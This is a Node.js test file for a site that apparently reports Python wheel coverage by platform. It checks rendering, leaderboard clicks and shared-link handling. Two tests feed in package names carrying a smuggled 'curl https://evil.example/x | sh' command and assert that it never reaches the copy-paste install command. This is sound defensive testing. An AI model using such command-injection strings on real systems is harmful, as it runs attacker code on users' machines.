// Extended offline verification for site/app.js & new enterprise features
"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const SITE = path.join(__dirname, "..", "..", "site");

test("app.js and logic.js execute together without syntax or declaration errors", () => {
  const logicSrc = fs.readFileSync(path.join(SITE, "logic.js"), "utf8");
  const appSrc = fs.readFileSync(path.join(SITE, "app.js"), "utf8");

  // Mock a minimal DOM context
  const mockDOM = {
    document: {
      getElementById: (id) => ({
        textContent: "",
        innerHTML: "",
        hidden: false,
        value: "",
        addEventListener: () => {},
        classList: { add: () => {}, remove: () => {}, toggle: () => {} },
        setAttribute: () => {},
        removeAttribute: () => {},
        style: {},
        querySelector: () => null,
        querySelectorAll: () => [],
      }),
      querySelector: () => null,
      querySelectorAll: () => [],
      addEventListener: () => {},
      documentElement: {
        getAttribute: () => "light",
        setAttribute: () => {},
      },
      body: {
        style: {},
        appendChild: () => {},
        removeChild: () => {},
      },
      createElement: (tag) => ({
        tagName: tag,
        href: "",
        textContent: "",
        download: "",
        click: () => {},
      }),
    },
    location: { hash: "" },
    history: { replaceState: () => {} },
    localStorage: {
      getItem: () => null,
      setItem: () => {},
    },
    window: {
      matchMedia: () => ({ matches: false }),
    },
    fetch: () => Promise.resolve({ ok: true, json: () => Promise.resolve({}) }),
    console,
    Date,
    Math,
    Number,
    String,
    Array,
    Object,
    Set,
    Map,
    Promise,
    URLSearchParams,
    encodeURIComponent,
    decodeURIComponent,
  };

  const context = vm.createContext(mockDOM);
  assert.doesNotThrow(() => {
    vm.runInContext(logicSrc, context);
    vm.runInContext(appSrc, context);
  });
});

test("Omni-checker and Leaderboard logic with actual dataset", () => {
  const coverageData = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "..", "data", "coverage.json"), "utf8"));
  const logicSrc = fs.readFileSync(path.join(SITE, "logic.js"), "utf8");
  const appSrc = fs.readFileSync(path.join(SITE, "app.js"), "utf8");

  const elements = {};
  const getEl = (id) => {
    if (!elements[id]) {
      elements[id] = {
        id,
        textContent: "",
        innerHTML: "",
        hidden: false,
        value: "",
        addEventListener: () => {},
        classList: { add: () => {}, remove: () => {}, toggle: () => {} },
        setAttribute: () => {},
        removeAttribute: () => {},
        style: {},
        querySelector: () => null,
        querySelectorAll: () => [],
      };
    }
    return elements[id];
  };

  const mockDOM = {
    document: {
      getElementById: getEl,
      querySelector: () => null,
      querySelectorAll: () => [],
      addEventListener: () => {},
      documentElement: {
        getAttribute: () => "light",
        setAttribute: () => {},
      },
      body: {
        style: {},
        appendChild: () => {},
        removeChild: () => {},
      },
      createElement: (tag) => ({
        tagName: tag,
        href: "",
        textContent: "",
        download: "",
        click: () => {},
      }),
    },
    location: { hash: "#package=numpy&python=3.13&platform=musl-aarch64" },
    history: { replaceState: () => {} },
    localStorage: { getItem: () => null, setItem: () => {} },
    window: { matchMedia: () => ({ matches: false }) },
    fetch: (url) => {
      if (url === "data/coverage.json") return Promise.resolve({ ok: true, json: () => Promise.resolve(coverageData) });
      return Promise.resolve({ ok: true, json: () => Promise.resolve([]) });
    },
    console,
    Date,
    Math,
    Number,
    String,
    Array,
    Object,
    Set,
    Map,
    Promise,
    URLSearchParams,
    encodeURIComponent,
    decodeURIComponent,
  };

  mockDOM.coverageData = coverageData;
  const context = vm.createContext(mockDOM);
  vm.runInContext(logicSrc, context);
  vm.runInContext(appSrc, context);

  // Set state
  vm.runInContext("state.data = coverageData; state.python = '3.13'; state.platform = 'musl-aarch64';", context);
  getEl("search").value = "numpy";
  getEl("omni-python-select").value = "3.13";
  getEl("omni-platform-select").value = "musl-aarch64";

  // Test Omni-Checker instant answer
  vm.runInContext("renderOmniAnswer()", context);
  const answerHtml = getEl("omni-answer").innerHTML;
  assert.ok(answerHtml.includes("verdict-wheel"), "numpy should have a prebuilt wheel verdict");
  assert.ok(answerHtml.includes("numpy"), "answer includes package name");
  assert.ok(answerHtml.includes("Alpine ARM64"), "answer includes platform name");
  assert.ok(answerHtml.includes("3.13"), "answer includes python version");

  // Test Minimized Summary bar
  const miniHtml = getEl("omni-minimized-summary").innerHTML;
  assert.ok(miniHtml.includes("badge-wheel"), "minimized summary includes wheel badge");
  assert.ok(miniHtml.includes(`Inspect ${coverageData.targets.length}`), "minimized summary includes the Inspect button, with the real target count");
  assert.ok(miniHtml.includes("Filter Gaps"), "minimized summary includes Filter Gaps button");

  // Test Leaderboard sorting: worst served first
  vm.runInContext("renderLeaderboard()", context);
  const boardHtml = getEl("platform-leaderboard").innerHTML;
  assert.ok(boardHtml.includes("Worst Served"), "leaderboard highlights worst served platforms");
  assert.ok(boardHtml.includes("leaderboard-card"), "leaderboard renders platform cards");

  // Test Gaps Table
  vm.runInContext("renderGaps()", context);
  const gapsHtml = getEl("gaps").innerHTML;
  assert.ok(gapsHtml.includes("<tr"), "gaps table has rows for Alpine ARM64");
  assert.ok(getEl("pagination-info-top").textContent.includes("Showing 1–25"), "pagination info shows page 1-25");
});


// ---------------------------------------------------------------------------------------------------------------
// The whole page under node: logic.js + app.js with a stub DOM that records event handlers, fed the repository's
// data/ files. Used to check what clicks and shared links re-render.
// ---------------------------------------------------------------------------------------------------------------
const ROOT = path.join(__dirname, "..", "..");

function element() {
  const handlers = {};
  return {
    innerHTML: "", textContent: "", value: "", hidden: false, href: "", dataset: {}, style: {}, handlers,
    addEventListener(type, fn) { handlers[type] = fn; },
    classList: { add() {}, remove() {}, toggle() {} },
    setAttribute() {}, removeAttribute() {}, getAttribute() { return null; },
    querySelector() { return null; }, querySelectorAll() { return []; },
    scrollIntoView() {}, append() {}, focus() {},
  };
}

async function loadPage(hash) {
  const elements = new Map();
  const location = { hash };
  const get = (id) => {
    if (!elements.has(id)) elements.set(id, element());
    return elements.get(id);
  };
  const context = {
    console, URLSearchParams, setTimeout, location,
    history: { replaceState(_state, _title, url) { location.hash = url; } },
    navigator: {},
    localStorage: { getItem() { return null; }, setItem() {} },
    window: { matchMedia: () => ({ matches: false }), innerWidth: 1280 },
    document: {
      getElementById: get,
      querySelector() { return null; }, querySelectorAll() { return []; },
      addEventListener() {},
      documentElement: { getAttribute() { return "light"; }, setAttribute() {} },
      body: { style: {}, appendChild() {}, removeChild() {} },
      createElement: element,
    },
    fetch: async (url) => {
      const file = path.join(ROOT, url);
      if (!/^data\/[a-z]+\.json$/.test(url) || !fs.existsSync(file)) return { ok: false, json: async () => null };
      const json = JSON.parse(fs.readFileSync(file, "utf8"));
      return { ok: true, json: async () => json };
    },
  };
  vm.createContext(context);
  const code = ["logic.js", "app.js"].map((f) => fs.readFileSync(path.join(ROOT, "site", f), "utf8")).join("\n;\n");
  vm.runInContext(code, context, { filename: "site/logic.js + site/app.js" });
  for (let i = 0; i < 50; i++) {
    if (get("platform-leaderboard").innerHTML) break;
    await new Promise((r) => setImmediate(r));
  }
  assert.doesNotMatch(get("meta").textContent, /Couldn't load/, "the page loaded its data");
  assert.ok(get("platform-leaderboard").innerHTML, "the platform cards rendered");
  return { get, context };
}

const coverage = () => JSON.parse(fs.readFileSync(path.join(ROOT, "data", "coverage.json"), "utf8"));
const cardClick = (platform) => ({ target: { closest: (sel) => (sel === ".leaderboard-card" ? { dataset: { pl: platform } } : null) } });

test("clicking a platform card updates the lookup's \"Why?\" command (#56)", async () => {
  const data = coverage();
  const python = data.targets[0].python;
  const name = data.packages[0].name;
  const page = await loadPage(`#python=${python}&platform=musl-aarch64&package=${name}`);
  const lookup = page.get("lookup");
  assert.match(lookup.innerHTML, / -t musl-aarch64 --explain/);

  page.get("platform-leaderboard").handlers.click(cardClick("win-arm64"));
  assert.match(lookup.innerHTML, / -t win-arm64 --explain/);
  assert.doesNotMatch(lookup.innerHTML, /musl-aarch64 --explain/);
});

test("a name from a shared link never reaches a copy-paste command unless it's a valid package name (#57)", async () => {
  const evil = "foo; curl https://evil.example/x | sh #";
  const page = await loadPage(`#package=${encodeURIComponent(evil)}`);
  for (const id of ["lookup", "omni-answer", "omni-minimized-summary"]) {
    const html = page.get(id).innerHTML;
    assert.doesNotMatch(html, /uvx wheelgap/, id);
    assert.doesNotMatch(html, /evil\.example/, id);
  }
  assert.match(page.get("lookup").innerHTML, /isn't a valid package name/);
});

test("a valid name outside the top gets the command; a pinned one finds its package (#57)", async () => {
  const outside = await loadPage("#package=surely-not-a-top-package-xyz");
  assert.match(outside.get("lookup").innerHTML, /uvx wheelgap surely-not-a-top-package-xyz -t all/);
  assert.match(outside.get("omni-answer").innerHTML, /uvx wheelgap surely-not-a-top-package-xyz -p /);

  const top = coverage().packages[0];
  const pinned = await loadPage(`#package=${top.name}==0.0.1`);
  const html = pinned.get("lookup").innerHTML;
  assert.match(html, new RegExp(`The scan checks the latest release, ${top.version.replace(/[.+]/g, "\\$&")}, not 0\\.0\\.1`));
  assert.doesNotMatch(html, /isn't in the top/);
});

test("pure Python packages are described as shipping a pure Python wheel, not as installing everywhere", async () => {
  const page = await loadPage("");
  for (const id of ["pure-note", "kpi-pure-pct"]) assert.doesNotMatch(page.get(id).textContent, /everywhere|anywhere/, id);
  assert.match(page.get("pure-note").textContent, /ship a pure Python wheel/);
});

test("the instant checker says when a pinned version isn't the release the scan checked", async () => {
  const top = coverage().packages[0];
  const page = await loadPage(`#package=${top.name}==0.0.1`);
  page.get("search").value = `${top.name}==0.0.1`;
  vm.runInContext("renderOmniAnswer()", page.context);
  const html = page.get("omni-answer").innerHTML;
  assert.match(html, /The scan checks the latest release/);
  assert.match(html, new RegExp(`uvx wheelgap ${top.name}==0\\.0\\.1 -p `));
});

test("a package whose lookup failed isn't described as building from source in its expanded row", async () => {
  const data = coverage();
  const python = data.targets[0].python;
  const at = data.targets.findIndex((t) => t.python === python && t.platform === "musl-aarch64");
  const errored = data.packages.find((p) => p.results[at] === "unknown");
  if (!errored) return; // nothing to check in this snapshot
  const page = await loadPage(`#python=${python}&platform=musl-aarch64`);
  vm.runInContext(`state.expandedPkg = ${JSON.stringify(errored.name)}; state.pageSize = "all"; renderGaps();`, page.context);
  const html = page.get("gaps").innerHTML;
  const row = html.slice(html.indexOf("gap-inline-row"));
  assert.match(row, /unknown/);
  assert.doesNotMatch(row.slice(0, row.indexOf("</tr>")), /builds from source/);
});

test("an invalid pin never reaches the checker's command (#57)", async () => {
  const top = coverage().packages[0];
  const evil = `${top.name}==1.0;curl https://evil.example/x|sh`;
  const page = await loadPage(`#package=${encodeURIComponent(evil)}`);
  page.get("search").value = evil;
  vm.runInContext("renderOmniAnswer()", page.context);
  for (const id of ["omni-answer", "omni-minimized-summary", "lookup"]) {
    assert.doesNotMatch(page.get(id).innerHTML, /evil\.example/, id);
  }
});
